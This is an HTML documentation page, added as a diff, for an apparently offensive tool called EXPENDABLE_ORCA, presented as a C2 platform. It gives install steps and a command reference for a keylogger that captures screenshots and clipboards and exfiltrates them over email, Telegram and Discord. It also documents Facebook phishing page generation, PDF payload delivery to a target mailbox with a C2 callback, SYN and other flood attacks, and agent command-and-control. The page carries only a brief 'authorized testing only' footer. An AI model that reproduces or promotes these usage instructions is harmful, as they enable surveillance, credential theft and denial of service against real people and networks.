@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>EXPENDABLE_ORCA · documentation</title>
+  <!-- Font Awesome 6 (free) -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+   
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #f9f2ff; 
+      font-family: 'Segoe UI', 'Comic Sans MS', 'Chalkboard SE', cursive, sans-serif;
+      color: #1a2a3a;
+      line-height: 1.6;
+      padding: 0 1rem;
+    }
+
+    /* main container */
+    .doc-wrapper {
+      max-width: 1300px;
+      margin: 2rem auto;
+      background: rgba(255, 255, 255, 0.75);
+      backdrop-filter: blur(2px);
+      border-radius: 3.5rem 3.5rem 2rem 2rem;
+      box-shadow: 0 20px 40px rgba(150, 80, 200, 0.2);
+      padding: 2rem 2.5rem;
+      border: 4px solid #ffd966;
+      transition: all 0.2s;
+    }
+
+   
+    .header {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 6px dotted #ff8a5c;
+      padding-bottom: 1rem;
+      margin-bottom: 2rem;
+    }
+
+    .logo h1 {
+      font-size: 3.2rem;
+      font-weight: 700;
+      background: linear-gradient(145deg, #2f5d8a, #6a4c9c);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      letter-spacing: -0.5px;
+      text-shadow: 6px 6px 0 #f9d56e;
+    }
+    .logo h1 i {
+      font-size: 3rem;
+      -webkit-text-fill-color: initial;
+      color: #ff6b4a;
+      text-shadow: 2px 2px 0 #f9d56e;
+    }
+    .logo .sub {
+      font-size: 1.1rem;
+      color: #b07fd9;
+      background: #fff1d6;
+      display: inline-block;
+      padding: 0.2rem 1rem;
+      border-radius: 30px;
+      border: 2px solid #ffb07c;
+      margin-top: 0.2rem;
+    }
+
+    .badge {
+      background: #ffdbb5;
+      padding: 0.5rem 1.2rem;
+      border-radius: 60px;
+      border: 3px solid #d48cff;
+      font-weight: bold;
+      color: #3d2b5a;
+      font-size: 1.2rem;
+      box-shadow: 0 6px 0 #b58cd9;
+    }
+    .badge i {
+      color: #ff6b4a;
+      margin-right: 8px;
+    }
+
+    /* step-by-step cards */
+    .step-section {
+      margin: 2.5rem 0 1.5rem;
+    }
+
+    .step-grid {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.8rem;
+      margin-top: 1.8rem;
+    }
+
+    .step-card {
+      background: #feffee;
+      flex: 1 1 220px;
+      border-radius: 40px 20px 40px 20px;
+      padding: 1.8rem 1.2rem;
+      border: 4px solid #b8d9ff;
+      box-shadow: 8px 8px 0 #b38bdb;
+      transition: 0.2s ease;
+      position: relative;
+    }
+    .step-card:hover {
+      transform: translateY(-6px);
+      box-shadow: 12px 12px 0 #d48cff;
+      border-color: #ff8a5c;
+    }
+    .step-card .num {
+      background: #ffb07c;
+      color: #2a1e3c;
+      font-size: 2rem;
+      font-weight: 900;
+      width: 50px;
+      height: 50px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 60% 40% 60% 40%;
+      margin-bottom: 1rem;
+      border: 3px solid #b38bdb;
+      box-shadow: 4px 4px 0 #b38bdb;
+    }
+    .step-card h3 {
+      color: #2f5d8a;
+      font-size: 1.5rem;
+      margin-bottom: 0.5rem;
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+    .step-card p {
+      color: #3f3a5a;
+      font-size: 0.95rem;
+    }
+    .step-card code {
+      background: #d9d0f0;
+      padding: 0.2rem 0.6rem;
+      border-radius: 30px;
+      font-size: 0.8rem;
+      border: 2px solid #ffb07c;
+      color: #2a1e3c;
+    }
+
+    /* features grid – colorful */
+    .feature-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(170px, 1fr));
+      gap: 1.5rem;
+      margin: 2rem 0;
+    }
+
+    .feature-item {
+      background: #ebf7ff;
+      border-radius: 30px 10px 30px 10px;
+      padding: 1.3rem 0.8rem;
+      text-align: center;
+      border: 4px solid #b38bdb;
+      box-shadow: 6px 6px 0 #ffb07c;
+      transition: 0.15s;
+      font-weight: 600;
+      color: #1e3d5e;
+    }
+    .feature-item i {
+      font-size: 2rem;
+      display: block;
+      margin-bottom: 6px;
+      color: #d46a4a;
+    }
+    .feature-item span {
+      background: #ffe0b0;
+      padding: 0.2rem 1rem;
+      border-radius: 40px;
+      border: 2px solid #d48cff;
+    }
+
+    /* code block / terminal style */
+    .code-block {
+      background: #1e2a3a;
+      color: #f0e9ff;
+      padding: 1.6rem 2rem;
+      border-radius: 50px 10px 50px 10px;
+      border-left: 12px solid #ff8a5c;
+      font-family: 'Fira Code', 'Courier New', monospace;
+      font-size: 0.9rem;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-break: break-word;
+      margin: 1.8rem 0;
+      box-shadow: 8px 8px 0 #b38bdb;
+    }
+    .code-block i {
+      color: #ffb07c;
+      margin-right: 8px;
+    }
+    .code-block .cmd {
+      color: #a8d8ff;
+    }
+    .code-block .comment {
+      color: #c9b0ff;
+      font-style: italic;
+    }
+
+    /* table – playful */
+    .cmd-table {
+      width: 100%;
+      border-collapse: collapse;
+      background: #fffcf0;
+      border-radius: 30px;
+      overflow: hidden;
+      border: 4px solid #b38bdb;
+      margin: 1.8rem 0;
+    }
+    .cmd-table th {
+      background: #2f5d8a;
+      color: #fff9e6;
+      padding: 0.9rem;
+      font-size: 1.1rem;
+      border-bottom: 4px solid #ff8a5c;
+    }
+    .cmd-table td {
+      padding: 0.9rem;
+      border-bottom: 2px dotted #ffdbb5;
+      color: #1f2f44;
+    }
+    .cmd-table tr:last-child td {
+      border-bottom: none;
+    }
+    .cmd-table tr:hover {
+      background: #ffefd6;
+    }
+
+    .cmd-table .tag {
+      background: #ffdbb5;
+      padding: 0.2rem 0.7rem;
+      border-radius: 40px;
+      font-size: 0.7rem;
+      font-weight: bold;
+      border: 2px solid #d48cff;
+      color: #3d2b5a;
+    }
+
+    /* footer */
+    .footer {
+      margin-top: 3.5rem;
+      text-align: center;
+      border-top: 6px dotted #ff8a5c;
+      padding-top: 2rem;
+      font-size: 0.9rem;
+      color: #3d3a5a;
+    }
+    .footer i {
+      color: #ff6b4a;
+    }
+    .footer a {
+      color: #6a4c9c;
+      font-weight: bold;
+      text-decoration: none;
+      border-bottom: 3px solid #f9d56e;
+    }
+
+    /* responsive */
+    @media (max-width: 650px) {
+      .doc-wrapper {
+        padding: 1rem;
+      }
+      .logo h1 {
+        font-size: 2.2rem;
+      }
+      .step-card {
+        flex: 1 1 100%;
+      }
+      .header {
+        flex-direction: column;
+        align-items: start;
+        gap: 0.8rem;
+      }
+    }
+
+    /* extra playful decorations */
+    .doodle {
+      background: #fce5d4;
+      border-radius: 100px 20px 100px 20px;
+      padding: 0.4rem 1.4rem;
+      display: inline-block;
+      border: 3px solid #d48cff;
+    }
+    .bg-purple-soft {
+      background: #e9daff;
+    }
+    .bg-orange-soft {
+      background: #ffdbb5;
+    }
+  </style>
+</head>
+<body>
+<div class="doc-wrapper">
+
+  <!-- HEADER -->
+  <div class="header">
+    <div class="logo">
+      <h1><i class="fas fa-shark"></i> EXPENDABLE_ORCA</h1>
+      <div class="sub"><i class="fas fa-robot"></i> v4.0.0 · ultimate C2 platform</div>
+    </div>
+    <div class="badge">
+      <i class="fas fa-book-open"></i> documentation
+    </div>
+  </div>
+
+  <!-- intro -->
+  <p style="font-size:1.3rem; background:#fff1d6; padding:0.5rem 1.2rem; border-radius: 60px; border:4px solid #b38bdb; display:inline-block;">
+    <i class="fas fa-child" style="color:#ff6b4a;"></i> Accurate Cyber Defense </p>
+  <p style="margin: 1.2rem 0 0.5rem; font-size:1.1rem;">
+    <i class="fas fa-star" style="color:#d48cff;"></i> 21,000+ security commands · multi‑platform bots · keylogger · spear phishing · DOS · agent mode · IP‑to‑domain · domain hosting
+  </p>
+
+  <!-- =========== STEP BY STEP INSTALLATION ============= -->
+  <div class="step-section">
+    <h2 style="font-size:2.2rem; color:#2f5d8a; border-left: 14px solid #ff8a5c; padding-left: 1rem;">
+      <i class="fas fa-shoe-prints" style="color:#d46a4a;"></i> step‑by‑step installation
+    </h2>
+    <div class="step-grid">
+
+      <div class="step-card">
+        <div class="num">1</div>
+        <h3><i class="fas fa-python" style="color:#6a4c9c;"></i> Python 3.7+</h3>
+        <p>Make sure Python ≥3.7 is installed. <br><code>python3 --version</code></p>
+      </div>
+
+      <div class="step-card">
+        <div class="num">2</div>
+        <h3><i class="fas fa-download" style="color:#d46a4a;"></i> Clone / download</h3>
+        <p>Get the script <code>expendable_orca.py</code> or clone the repo.</p>
+        <p style="background:#d9d0f0; border-radius: 60px; padding:0.2rem 0.8rem; display:inline-block; border:2px solid #ffb07c;">
+          <i class="fas fa-code"></i> git clone https://github.com/Iankulani/expendable_orca.git </p>
+      </div>
+
+      <div class="step-card">
+        <div class="num">3</div>
+        <h3><i class="fas fa-cubes" style="color:#b07fd9;"></i> Install deps</h3>
+        <p><code>pip install -r requirements.txt</code> or manually:</p>
+        <ul style="list-style: none; font-size:0.9rem; margin-top:6px;">
+          <li><i class="fas fa-check-circle" style="color:#6a4c9c;"></i> cryptography</li>
+          <li><i class="fas fa-check-circle" style="color:#6a4c9c;"></i> pynput</li>
+          <li><i class="fas fa-check-circle" style="color:#6a4c9c;"></i> paramiko</li>
+          <li><i class="fas fa-check-circle" style="color:#6a4c9c;"></i> discord.py / telethon / slack-sdk</li>
+          <li><i class="fas fa-check-circle" style="color:#6a4c9c;"></i> flask, flask-socketio, scapy, etc.</li>
+        </ul>
+      </div>
+
+      <div class="step-card">
+        <div class="num">4</div>
+        <h3><i class="fas fa-terminal" style="color:#ff6b4a;"></i> Run</h3>
+        <p><code>sudo python3 expendable_orca.py</code> (admin recommended)</p>
+        <p style="background:#ffdbb5; border-radius:60px; padding:0.2rem 0.8rem; display:inline-block; border:2px solid #d48cff;">
+          <i class="fas fa-shield-alt"></i> interactive shell
+        </p>
+      </div>
+
+      <div class="step-card">
+        <div class="num">5</div>
+        <h3><i class="fas fa-comment-dots" style="color:#d46a4a;"></i> Bots &amp; web</h3>
+        <p>Follow the setup prompts to enable Discord, Telegram, Slack, Signal, iMessage, WhatsApp, Web Dashboard.</p>
+        <p><span class="doodle"><i class="fas fa-globe"></i> web: localhost:5000</span></p>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- QUICKSTART TERMINAL -->
+  <div class="code-block">
+    <i class="fas fa-play"></i> <span class="comment"># quickstart example</span>
+    <span class="cmd">$ python3 expendable_orca.py</span>
+    <span class="comment">🦈 EXPENDABLE_ORCA v4.0.0</span>
+    <span class="cmd">[session] 🦈> help</span>
+    <span class="comment">... 21000+ commands available ...</span>
+    <span class="cmd">[session] 🦈> ping 8.8.8.8</span>
+    <span class="cmd">[session] 🦈> keylogger_start</span>
+    <span class="cmd">[session] 🦈> deploy_pdf "invoice" "target@mail.com" "http://c2.local"</span>
+  </div>
+
+  <!-- ============= FEATURE HIGHLIGHTS ============== -->
+  <h2 style="font-size:2rem; color:#2f5d8a; border-left: 14px solid #d48cff; padding-left:1rem; margin-top:2rem;">
+    <i class="fas fa-rocket" style="color:#ff8a5c;"></i> feature highlights
+  </h2>
+  <div class="feature-grid">
+    <div class="feature-item"><i class="fas fa-terminal"></i><span>21k+ commands</span></div>
+    <div class="feature-item"><i class="fab fa-discord"></i><span>Discord · Telegram · Slack</span></div>
+    <div class="feature-item"><i class="fas fa-keyboard"></i><span>keylogger (F10)</span></div>
+    <div class="feature-item"><i class="fas fa-envelope-open-text"></i><span>spear phishing</span></div>
+    <div class="feature-item"><i class="fas fa-bolt"></i><span>DOS/DDOS</span></div>
+    <div class="feature-item"><i class="fas fa-robot"></i><span>agent C2</span></div>
+    <div class="feature-item"><i class="fas fa-network-wired"></i><span>traffic gen (ICMP/TCP/UDP/HTTP/DNS/ARP)</span></div>
+    <div class="feature-item"><i class="fas fa-map-pin"></i><span>IP → domain · domain hosting</span></div>
+    <div class="feature-item"><i class="fas fa-file-pdf"></i><span>PDF/email/link deployment</span></div>
+    <div class="feature-item"><i class="fas fa-shield-virus"></i><span>Nikto · Nmap · netcat</span></div>
+    <div class="feature-item"><i class="fas fa-chart-pie"></i><span>graphics · reports</span></div>
+    <div class="feature-item"><i class="fas fa-clipboard-list"></i><span>clipboard capture</span></div>
+  </div>
+
+  <!-- ============ COMMAND REFERENCE (sample) ============ -->
+  <h2 style="font-size:2rem; color:#2f5d8a; border-left: 14px solid #ff8a5c; padding-left:1rem; margin-top:1.8rem;">
+    <i class="fas fa-list-ul" style="color:#d46a4a;"></i> essential commands
+  </h2>
+  <table class="cmd-table">
+    <thead><tr><th>command</th><th>description</th><th>example</th></tr></thead>
+    <tbody>
+      <tr><td><span class="tag">ping</span></td><td>ICMP ping</td><td><code>ping 8.8.8.8</code></td></tr>
+      <tr><td><span class="tag">nmap_quick</span></td><td>fast port scan</td><td><code>nmap_quick 192.168.1.1</code></td></tr>
+      <tr><td><span class="tag">traffic</span></td><td>generate traffic</td><td><code>traffic icmp 192.168.1.10 30</code></td></tr>
+      <tr><td><span class="tag">nikto</span></td><td>web vuln scan</td><td><code>nikto example.com</code></td></tr>
+      <tr><td><span class="tag">dos_syn</span></td><td>SYN flood</td><td><code>dos_syn 10.0.0.1 80 30 100</code></td></tr>
+      <tr><td><span class="tag">phish_facebook</span></td><td>generate FB phishing</td><td><code>phish_facebook</code></td></tr>
+      <tr><td><span class="tag">deploy_pdf</span></td><td>PDF payload</td><td><code>deploy_pdf invoice target@mail.com http://c2</code></td></tr>
+      <tr><td><span class="tag">ip_to_domain</span></td><td>reverse DNS</td><td><code>ip_to_domain 8.8.8.8</code></td></tr>
+      <tr><td><span class="tag">host_domain</span></td><td>host domain on IP</td><td><code>host_domain 192.168.1.100 my.local 8080</code></td></tr>
+      <tr><td><span class="tag">keylogger_start</span></td><td>start keylogger</td><td><code>keylogger_start</code></td></tr>
+      <tr><td><span class="tag">agent_register</span></td><td>register agent</td><td><code>agent_register orca1 10.0.0.5</code></td></tr>
+    </tbody>
+  </table>
+
+  <!-- ============= PLATFORM BOT SETUP ============= -->
+  <div style="background:#e9daff; border-radius: 50px 10px 50px 10px; padding:1.2rem 1.8rem; border:6px solid #ffb07c; margin:2rem 0;">
+    <h3 style="display:flex; gap:10px; align-items:center; color:#2f5d8a;">
+      <i class="fab fa-discord" style="color:#5865F2;"></i>
+      <i class="fab fa-telegram" style="color:#26A5E4;"></i>
+      <i class="fab fa-slack" style="color:#4A154B;"></i>
+      <i class="fas fa-message" style="color:#ff6b4a;"></i>
+      <span style="background:#fff1d6; border-radius:60px; padding:0.2rem 1.2rem; border:3px solid #d48cff;">multi‑platform bots</span>
+    </h3>
+    <p><i class="fas fa-check-circle" style="color:#6a4c9c;"></i> Discord · Telegram · Slack · Signal · iMessage · Google Chat · WhatsApp · Web</p>
+    <p style="background:#fffcf0; border-radius:60px; padding:0.4rem 1.2rem; display:inline-block; border:4px solid #b38bdb;">
+      <i class="fas fa-cog"></i> Configure via interactive setup or <code>config.json</code>
+    </p>
+  </div>
+
+  <!-- ============= KEYLOGGER + DEPLOYMENT ============= -->
+  <div style="display:flex; flex-wrap:wrap; gap:1.8rem; margin:2rem 0;">
+    <div style="flex:1; min-width:220px; background:#ffedd9; padding:1.2rem; border-radius: 40px 10px 40px 10px; border:6px solid #b38bdb;">
+      <h3><i class="fas fa-keyboard" style="color:#d46a4a;"></i> advanced keylogger</h3>
+      <ul style="list-style: none;">
+        <li><i class="fas fa-check" style="color:#6a4c9c;"></i> PDF / Email / Link deployment</li>
+        <li><i class="fas fa-check" style="color:#6a4c9c;"></i> screenshot &amp; clipboard capture</li>
+        <li><i class="fas fa-check" style="color:#6a4c9c;"></i> exfil via file, email, C2, Telegram, Discord</li>
+        <li><i class="fas fa-check" style="color:#6a4c9c;"></i> F10 to toggle</li>
+      </ul>
+    </div>
+    <div style="flex:1; min-width:220px; background:#e1eefe; padding:1.2rem; border-radius: 40px 10px 40px 10px; border:6px solid #ff8a5c;">
+      <h3><i class="fas fa-globe" style="color:#2f5d8a;"></i> domain hosting &amp; translation</h3>
+      <ul style="list-style: none;">
+        <li><i class="fas fa-check" style="color:#d46a4a;"></i> <code>ip_to_domain</code> · <code>domain_to_ip</code></li>
+        <li><i class="fas fa-check" style="color:#d46a4a;"></i> <code>host_domain</code> · <code>host_website</code></li>
+        <li><i class="fas fa-check" style="color:#d46a4a;"></i> <code>list_domains</code> · <code>domain_info</code></li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- ============= DOS & AGENT ============= -->
+  <div style="display:flex; flex-wrap:wrap; gap:1.8rem; margin:1.8rem 0;">
+    <div style="flex:1; min-width:200px; background:#fce5d4; padding:1rem; border-radius: 30px 10px 30px 10px; border:6px solid #d48cff;">
+      <h4><i class="fas fa-skull" style="color:#ff6b4a;"></i> DOS/DDOS</h4>
+      <p><code>dos_syn</code> · <code>dos_udp</code> · <code>dos_http</code> · <code>dos_icmp</code></p>
+    </div>
+    <div style="flex:1; min-width:200px; background:#d9d0f0; padding:1rem; border-radius: 30px 10px 30px 10px; border:6px solid #ffb07c;">
+      <h4><i class="fas fa-robot" style="color:#2f5d8a;"></i> agent C2</h4>
+      <p><code>agent_register</code> · <code>agent_command</code> · <code>agent_list</code></p>
+    </div>
+    <div style="flex:1; min-width:200px; background:#ffedd9; padding:1rem; border-radius: 30px 10px 30px 10px; border:6px solid #b38bdb;">
+      <h4><i class="fas fa-chart-simple" style="color:#d46a4a;"></i> reports &amp; graphics</h4>
+      <p><code>report</code> · <code>status</code> · <code>threats</code></p>
+    </div>
+  </div>
+
+  <!-- ============= FOOTER ============= -->
+  <div class="footer">
+    <p><i class="fas fa-crown" style="color:#ff8a5c;"></i> EXPENDABLE_ORCA v4.0.0 · author: <strong>Ian Carter Kulani</strong></p>
+    <p><i class="fas fa-shield-halved"></i> for authorized security testing only · all activity logged</p>
+    <p style="margin-top:1rem;">
+      <i class="fas fa-child" style="color:#d48cff;"></i>  · 
+      <span style="color:#ff6b4a;">red</span> · 
+      <span style="color:#ff8a5c;">orange</span> · 
+      <span style="color:#6a4c9c;">purple</span> 
+      <i class="fas fa-paint-brush" style="color:#b07fd9;"></i>
+    </p>
+    <p><a href="#"><i class="fas fa-book"></i> full documentation · github</a></p>
+  </div>
+
+</div>
+</body>
+</html>
